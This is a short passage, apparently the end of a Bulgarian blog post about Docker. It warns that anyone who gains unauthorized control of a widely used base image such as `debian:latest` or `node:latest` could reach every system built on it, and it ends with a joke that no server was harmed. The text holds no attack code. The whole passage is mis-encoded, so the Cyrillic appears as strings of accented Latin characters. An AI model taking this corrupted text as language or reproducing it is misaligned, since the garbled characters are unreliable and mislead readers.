- –ê–∫–æ —á–æ–≤–µ–∫ –ø–æ–ª—É—á–∏ –Ω–µ–ø—Ä–∞–≤–æ–º–µ—Ä–µ–Ω –¥–æ—Å—Ç—ä–ø –¥–∞ –ø—Ä–æ–º–µ–Ω—è –æ—Ä–∏–≥–∏–Ω–∞–ª–Ω–∏—è image (–Ω–∞–ø—Ä–∏–º–µ—Ä `debian:latest`, `node:latest` –∏–ª–∏ –ø–æ–¥–æ–±–µ–Ω) –º–æ–∂–µ –¥–∞ –ø–æ–ª—É—á–∏ –¥–æ—Å—Ç—ä–ø –¥–æ –≤—Å–∏—á–∫–æ, –∫–æ–µ—Ç–æ –≥–æ –∏–∑–ø–æ–ª–∑–≤–∞.

–ù–∏—Ç–æ –µ–¥–∏–Ω —Å—ä—Ä–≤—ä—Ä –Ω–µ –±–µ—à–µ –Ω–∞—Ä–∞–Ω–µ–Ω –ø–æ –≤—Ä–µ–º–µ –Ω–∞ –ø–∏—Å–∞–Ω–µ—Ç–æ –Ω–∞ —Ç–æ–∑–∏ –ø–æ—Å—Ç.
